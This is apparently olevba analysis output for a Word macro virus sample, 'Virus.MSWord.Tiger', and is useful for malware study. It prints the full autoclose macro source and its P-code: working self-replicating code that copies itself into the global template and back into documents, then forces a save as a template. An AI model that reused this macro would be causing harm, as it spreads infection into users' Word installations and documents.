olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Tiger
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Tiger - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO autoclose.bas 
in file: ./Virus.MSWord.Tiger - OLE stream: 'Macros/VBA/autoclose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim f$
On Error Resume Next

WordBasic.NewToolbar "Spirit of the Shadow Warrior"
WordBasic.ViewToolbars Toolbar:="Spirit of the Shadow Warrior", Show:=1
WordBasic.DeleteButton "Spirit of the Shadow Warrior", 1
WordBasic.AddButton "Spirit of the Shadow Warrior", 1, 1, "autoclose", "Into a soul absolutely free from thoughts and emotions, even a tiger finds no room to insert its fierce claws...", 0, " 2 "


f$ = WordBasic.[FileName$]()

WordBasic.MacroCopy f$ + ":autoclose", "global:autoclose"
WordBasic.MacroCopy "global:autoclose", f$ + ":autoclose"

Dim s As Object: Set s = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs s
If s.Format = 0 Then
    s.Format = 1
    WordBasic.FileSaveAs s
End If

WordBasic.PrintStatusBar "If you want to be heard, sometimes you must be silent. - Shadow Warrior"

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Tiger
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/autoclose - 2381 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn False
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' Line #5:
' 	LitStr 0x001C "Spirit of the Shadow Warrior"
' 	Ld WordBasic 
' 	ArgsMemCall NewToolbar 0x0001 
' Line #6:
' 	LitStr 0x001C "Spirit of the Shadow Warrior"
' 	ParamNamed Toolbar 
' 	LitDI2 0x0001 
' 	ParamNamed Show 
' 	Ld WordBasic 
' 	ArgsMemCall ViewToolbars 0x0002 
' Line #7:
' 	LitStr 0x001C "Spirit of the Shadow Warrior"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall DeleteButton 0x0002 
' Line #8:
' 	LitStr 0x001C "Spirit of the Shadow Warrior"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitStr 0x0009 "autoclose"
' 	LitStr 0x0070 "Into a soul absolutely free from thoughts and emotions, even a tiger finds no room to insert its fierce claws..."
' 	LitDI2 0x0000 
' 	LitStr 0x0003 " 2 "
' 	Ld WordBasic 
' 	ArgsMemCall AddButton 0x0007 
' Line #9:
' Line #10:
' Line #11:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St False$ 
' Line #12:
' Line #13:
' 	Ld False$ 
' 	LitStr 0x000A ":autoclose"
' 	Add 
' 	LitStr 0x0010 "global:autoclose"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	LitStr 0x0010 "global:autoclose"
' 	Ld False$ 
' 	LitStr 0x000A ":autoclose"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' Line #16:
' 	Dim 
' 	VarDefn s (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set s 
' Line #17:
' 	Ld s 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #18:
' 	Ld s 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	Ld s 
' 	MemSt Format$ 
' Line #20:
' 	Ld s 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #21:
' 	EndIfBlock 
' Line #22:
' Line #23:
' 	LitStr 0x0047 "If you want to be heard, sometimes you must be silent. - Shadow Warrior"
' 	Ld WordBasic 
' 	ArgsMemCall PrintStatusBar 0x0001 
' Line #24:
' Line #25:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

